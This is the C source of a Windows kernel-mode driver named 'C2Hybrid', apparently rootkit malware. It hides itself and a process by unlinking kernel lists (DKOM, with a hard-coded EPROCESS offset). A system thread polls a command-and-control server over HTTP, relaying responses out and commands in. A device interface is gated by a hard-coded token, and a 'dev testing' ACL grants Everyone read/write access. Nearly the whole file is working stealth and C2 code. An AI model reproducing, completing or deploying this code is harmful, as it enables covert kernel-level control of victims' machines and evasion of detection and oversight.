#include <ntifs.h>
#include <ntddk.h>
#include <ntstrsafe.h>
#include <wdmsec.h>
#include "libwsk/libwsk.h"
#include <bcrypt.h>

// ---- STEALTH OPTIONS ----
#define ENABLE_DRIVER_HIDE    1
#define ENABLE_PROCESS_HIDE   1

#define DRIVER_TAG 'C2HD'
#define SERVER_IP  "127.0.0.1"
#define SERVER_PORT 8080

#define IOCTL_C2_AUTH   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_C2_QUERY  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define AUTH_TOKEN      "SuperSecret123"
#define MY_SDDL L"D:P(A;;GA;;;SY)(A;;GA;;;BA)"
// Minimal LDR_DATA_TABLE_ENTRY definition for DKOM (Win10 x64, check for your version!)
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    // ... (other fields omitted for brevity)
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;


typedef struct _C2_SESSION {
    ULONG   Pid;
    UCHAR   SessionToken[32];
    BOOLEAN Valid;
} C2_SESSION, * PC2_SESSION;

#define MAX_SESSIONS 8
C2_SESSION g_Sessions[MAX_SESSIONS] = { 0 };
FAST_MUTEX g_SessionMutex;

PWSK_SOCKET g_C2Socket = NULL;
HANDLE g_C2ThreadHandle = NULL;
BOOLEAN g_StopThread = FALSE;
PDEVICE_OBJECT g_DeviceObject = NULL;
UNICODE_STRING g_DeviceName = RTL_CONSTANT_STRING(L"\\Device\\C2Hybrid");
UNICODE_STRING g_SymbolicLink = RTL_CONSTANT_STRING(L"\\DosDevices\\C2Hybrid");
WSKDATA g_WskData; // Global or local variable
CHAR g_LastC2Command[256] = { 0 };
CHAR g_LastUserResponse[256] = { 0 };
FAST_MUTEX g_StateMutex;

// ---- DKOM: Driver Hiding ----
#if ENABLE_DRIVER_HIDE
VOID HideDriver(PDRIVER_OBJECT DriverObject) {
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    RemoveEntryList(&entry->InLoadOrderLinks);
    RtlZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.Length);
    RtlZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.Length);
    entry->BaseDllName.Length = 0;
    entry->FullDllName.Length = 0;
}
#endif

// ---- DKOM: Process Hiding ----
#if ENABLE_PROCESS_HIDE
VOID HideProcessByPid(HANDLE pid) {
    PEPROCESS eproc;
    if (NT_SUCCESS(PsLookupProcessByProcessId(pid, &eproc))) {
        // Offset for ActiveProcessLinks (Win10 x64 1903/2004, check for your version!)
        PLIST_ENTRY list = (PLIST_ENTRY)((PUCHAR)eproc + 0x448);
        list->Blink->Flink = list->Flink;
        list->Flink->Blink = list->Blink;
        list->Flink = list->Blink = list;
        ObDereferenceObject(eproc);
    }
}
#endif

// ---- Session Management ----
BOOLEAN FindSession(ULONG Pid, UCHAR* Token) {
    BOOLEAN found = FALSE;
    ExAcquireFastMutex(&g_SessionMutex);
    for (int i = 0; i < MAX_SESSIONS; ++i) {
        if (g_Sessions[i].Valid && g_Sessions[i].Pid == Pid &&
            RtlCompareMemory(g_Sessions[i].SessionToken, Token, sizeof(g_Sessions[i].SessionToken)) == sizeof(g_Sessions[i].SessionToken)) {
            found = TRUE;
            break;
        }
    }
    ExReleaseFastMutex(&g_SessionMutex);
    return found;
}

NTSTATUS AddSession(ULONG Pid, UCHAR* Token) {
    NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
    ExAcquireFastMutex(&g_SessionMutex);
    for (int i = 0; i < MAX_SESSIONS; ++i) {
        if (!g_Sessions[i].Valid) {
            g_Sessions[i].Pid = Pid;
            RtlCopyMemory(g_Sessions[i].SessionToken, Token, sizeof(g_Sessions[i].SessionToken));
            g_Sessions[i].Valid = TRUE;
            status = STATUS_SUCCESS;
            break;
        }
    }
    ExReleaseFastMutex(&g_SessionMutex);
    return status;
}

// ---- Networking Helpers ----
NTSTATUS ConnectSocket(PWSK_SOCKET* Socket) {
    NTSTATUS status;
    SOCKADDR_IN serverAddr;
    IN_ADDR ipAddr;
    CHAR* term = NULL;

    status = WSKSocket(Socket, AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL);
    if (!NT_SUCCESS(status)) return status;

    RtlZeroMemory(&serverAddr, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = RtlUshortByteSwap(SERVER_PORT);

    if (RtlIpv4StringToAddressA(SERVER_IP, TRUE, &term, &ipAddr) == STATUS_SUCCESS)
        serverAddr.sin_addr.s_addr = ipAddr.S_un.S_addr;
    else {
        WSKCloseSocket(*Socket);
        *Socket = NULL;
        return STATUS_INVALID_PARAMETER;
    }

    status = WSKConnect(*Socket, (PSOCKADDR)&serverAddr, sizeof(serverAddr));
    if (!NT_SUCCESS(status)) {
        WSKCloseSocket(*Socket);
        *Socket = NULL;
    }
    return status;
}

NTSTATUS SendHttpRequest(PWSK_SOCKET Socket, const CHAR* Host, const CHAR* Path) {
    CHAR request[256];
    SIZE_T bytesSent = 0;
    NTSTATUS status;

    RtlStringCchPrintfA(request, sizeof(request),
        "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", Path, Host);

    status = WSKSend(Socket, request, (ULONG)strlen(request), &bytesSent, 0, NULL, NULL);
    return status;
}

NTSTATUS ReceiveHttpResponse(PWSK_SOCKET Socket, CHAR* Response, SIZE_T ResponseLen, SIZE_T* BytesReceived) {
    NTSTATUS status;
    *BytesReceived = 0;
    RtlZeroMemory(Response, ResponseLen);
    status = WSKReceive(Socket, Response, (ULONG)ResponseLen - 1, BytesReceived, 0, NULL, NULL);
    return status;
}

// ---- HTTP Command Parsing ----
VOID ParseHttpCommand(const CHAR* Response) {
    const CHAR* header_end = strstr(Response, "\r\n\r\n");
    if (header_end) {
        ExAcquireFastMutex(&g_StateMutex);
        RtlStringCchCopyA(g_LastC2Command, sizeof(g_LastC2Command), header_end + 4);
        ExReleaseFastMutex(&g_StateMutex);
    }
}

// ---- C2 Polling Thread ----
VOID C2ThreadRoutine(PVOID StartContext) {
    UNREFERENCED_PARAMETER(StartContext);

    while (!g_StopThread) {
        NTSTATUS status;
        CHAR response[1024] = { 0 };
        SIZE_T bytesReceived = 0;

        status = ConnectSocket(&g_C2Socket);
        if (!NT_SUCCESS(status)) {
            KeDelayExecutionThread(KernelMode, FALSE, &(LARGE_INTEGER){.QuadPart = -2 * 1000 * 1000 * 10 }); // 2s
            continue;
        }

        CHAR path[512] = { 0 };
        ExAcquireFastMutex(&g_StateMutex);
        RtlStringCchPrintfA(path, sizeof(path), "/command?last_response=%s", g_LastUserResponse);
        ExReleaseFastMutex(&g_StateMutex);

        status = SendHttpRequest(g_C2Socket, "localhost", path);
        if (!NT_SUCCESS(status)) {
            WSKCloseSocket(g_C2Socket); g_C2Socket = NULL;
            continue;
        }

        status = ReceiveHttpResponse(g_C2Socket, response, sizeof(response), &bytesReceived);
        if (!NT_SUCCESS(status)) {
            WSKCloseSocket(g_C2Socket); g_C2Socket = NULL;
            continue;
        }

        ParseHttpCommand(response);

        WSKCloseSocket(g_C2Socket); g_C2Socket = NULL;

        KeDelayExecutionThread(KernelMode, FALSE, &(LARGE_INTEGER){.QuadPart = -10 * 1000 * 1000 * 10 });
    }

    PsTerminateSystemThread(STATUS_SUCCESS);
}

// ---- IOCTL Handler ----
NTSTATUS DeviceIoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
    ULONG_PTR info = 0;
    ULONG pid = (ULONG)PsGetCurrentProcessId();

    switch (stack->Parameters.DeviceIoControl.IoControlCode)
    {
    case IOCTL_C2_AUTH:
        if (stack->Parameters.DeviceIoControl.InputBufferLength >= 32 &&
            stack->Parameters.DeviceIoControl.OutputBufferLength >= 32)
        {
            CHAR* inToken = (CHAR*)Irp->AssociatedIrp.SystemBuffer;
            UCHAR sessionToken[32] = { 0 };

            if (strncmp(inToken, AUTH_TOKEN, strlen(AUTH_TOKEN)) != 0) {
                status = STATUS_ACCESS_DENIED;
                break;
            }

            if (!NT_SUCCESS(BCryptGenRandom(NULL, sessionToken, sizeof(sessionToken), BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
                status = STATUS_UNSUCCESSFUL;
                break;
            }
            AddSession(pid, sessionToken);
            RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, sessionToken, sizeof(sessionToken));
            info = sizeof(sessionToken);
            status = STATUS_SUCCESS;
        }
        break;

    case IOCTL_C2_QUERY:
        // Input: session token + user data; Output: session token + c2 command
        if (stack->Parameters.DeviceIoControl.InputBufferLength >= 32 + 256 &&
            stack->Parameters.DeviceIoControl.OutputBufferLength >= 32 + 256)
        {
            UCHAR* inSession = (UCHAR*)Irp->AssociatedIrp.SystemBuffer;
            UCHAR* userData = inSession + 32;
            UCHAR* outSession = (UCHAR*)Irp->AssociatedIrp.SystemBuffer;
            UCHAR* outCmd = outSession + 32;

            if (!FindSession(pid, inSession)) {
                status = STATUS_ACCESS_DENIED;
                break;
            }

            ExAcquireFastMutex(&g_StateMutex);
            RtlCopyMemory(g_LastUserResponse, userData, sizeof(g_LastUserResponse) - 1);
            RtlCopyMemory(outCmd, g_LastC2Command, sizeof(g_LastC2Command));
            ExReleaseFastMutex(&g_StateMutex);

            status = STATUS_SUCCESS;
            info = 32 + 256;
        }
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = info;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}
PSECURITY_DESCRIPTOR g_SecurityDescriptor = NULL;

// ---- Device Object Security ----
NTSTATUS CreateDevice(PDRIVER_OBJECT DriverObject) {

    NTSTATUS status;
    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\C2Hybrid");
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\DosDevices\\C2Hybrid");

    // 1. Create device
    status = IoCreateDevice(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        0,
        FALSE,
        &g_DeviceObject
    );
    if (!NT_SUCCESS(status)) return status;

    // 2. Allocate and init security descriptor
    g_SecurityDescriptor = ExAllocatePoolWithTag(NonPagedPoolNx, sizeof(SECURITY_DESCRIPTOR), 'secT');
    if (!g_SecurityDescriptor) {
        IoDeleteDevice(g_DeviceObject);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    status = RtlCreateSecurityDescriptor(g_SecurityDescriptor, SECURITY_DESCRIPTOR_REVISION);
    if (!NT_SUCCESS(status)) goto Cleanup;

    // 3. Create ACL (enough space for 2 ACEs)
  // 3. Calculate correct ACL size for SYSTEM + Admins
    ULONG aclSize =
        sizeof(ACL) +
        (sizeof(ACCESS_ALLOWED_ACE) - sizeof(ULONG) + RtlLengthSid(SeExports->SeLocalSystemSid)) +
        (sizeof(ACCESS_ALLOWED_ACE) - sizeof(ULONG) + RtlLengthSid(SeExports->SeAliasAdminsSid)) +
        (sizeof(ACCESS_ALLOWED_ACE) - sizeof(ULONG) + RtlLengthSid(SeExports->SeWorldSid));

    PACL acl = ExAllocatePoolWithTag(NonPagedPoolNx, aclSize, 'aclT');
    if (!acl) {
        status = STATUS_INSUFFICIENT_RESOURCES;
        goto CleanupAcl;
    }

    status = RtlCreateAcl(acl, aclSize, ACL_REVISION);
    if (!NT_SUCCESS(status)) goto CleanupAcl;

    // 4. Add SYSTEM ACE
    status = RtlAddAccessAllowedAce(acl, ACL_REVISION, GENERIC_ALL, SeExports->SeLocalSystemSid);
    if (!NT_SUCCESS(status)) goto CleanupAcl;

    // 5. Add Admins ACE
    status = RtlAddAccessAllowedAce(acl, ACL_REVISION, GENERIC_ALL, SeExports->SeAliasAdminsSid);
    if (!NT_SUCCESS(status)) goto CleanupAcl;

    // (Optional) Add Everyone ACE for dev testing
    status = RtlAddAccessAllowedAce(acl, ACL_REVISION, GENERIC_READ | GENERIC_WRITE, SeExports->SeWorldSid);
    if (!NT_SUCCESS(status)) goto CleanupAcl;

    // 6. Assign ACL to descriptor
    status = RtlSetDaclSecurityDescriptor(g_SecurityDescriptor, TRUE, acl, FALSE);
    if (!NT_SUCCESS(status)) goto CleanupAcl;

    // 7. Assign security descriptor to device
    g_DeviceObject->SecurityDescriptor = g_SecurityDescriptor;

    // 8. Create symbolic link
    status = IoCreateSymbolicLink(&symLink, &deviceName);
    if (!NT_SUCCESS(status)) goto CleanupAcl;

    g_SymbolicLink = symLink;
    g_DeviceObject->Flags |= DO_BUFFERED_IO;
    return STATUS_SUCCESS;

CleanupAcl:
    ExFreePoolWithTag(acl, 'aclT');
Cleanup:
    ExFreePoolWithTag(g_SecurityDescriptor, 'secT');
    g_SecurityDescriptor = NULL;
    IoDeleteDevice(g_DeviceObject);
    return status;
}


// ---- Dispatch ----
NTSTATUS DispatchCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    return DeviceIoControl(DeviceObject, Irp);
}

// ---- Unload ----
VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    g_StopThread = TRUE;
    if (g_C2ThreadHandle) {
        KeWaitForSingleObject(g_C2ThreadHandle, Executive, KernelMode, FALSE, NULL);
        ZwClose(g_C2ThreadHandle);
        g_C2ThreadHandle = NULL;
    }
    if (g_DeviceObject) {
        IoDeleteSymbolicLink(&g_SymbolicLink);
        IoDeleteDevice(g_DeviceObject);
    }

    if (g_SecurityDescriptor) {
        ExFreePoolWithTag(g_SecurityDescriptor, 'secT');
        g_SecurityDescriptor = NULL;
    }
    WSKCleanup();
    DbgPrint("C2HYBRID: Driver unloaded\n");
}

// ---- Entry ----
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS status;

    ExInitializeFastMutex(&g_SessionMutex);
    ExInitializeFastMutex(&g_StateMutex);

    status = WSKStartup(MAKE_WSK_VERSION(1, 0), &g_WskData);
    if (!NT_SUCCESS(status)) {
        DbgPrint("C2HYBRID: WSKStartup failed: 0x%08X\n", status);
        return status;
    }

    status = CreateDevice(DriverObject);
    if (!NT_SUCCESS(status)) {
        WSKCleanup();
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
    DriverObject->DriverUnload = DriverUnload;

#if ENABLE_DRIVER_HIDE
    HideDriver(DriverObject);
#endif

#if ENABLE_PROCESS_HIDE
    // Hide the current process (driver host process, usually System)
    HideProcessByPid(PsGetCurrentProcessId());
#endif

    status = PsCreateSystemThread(
        &g_C2ThreadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, C2ThreadRoutine, NULL);
    if (!NT_SUCCESS(status)) {
        IoDeleteSymbolicLink(&g_SymbolicLink);
        IoDeleteDevice(g_DeviceObject);
        WSKCleanup();
        return status;
    }

    DbgPrint("C2HYBRID: Driver loaded\n");
    return STATUS_SUCCESS;
}
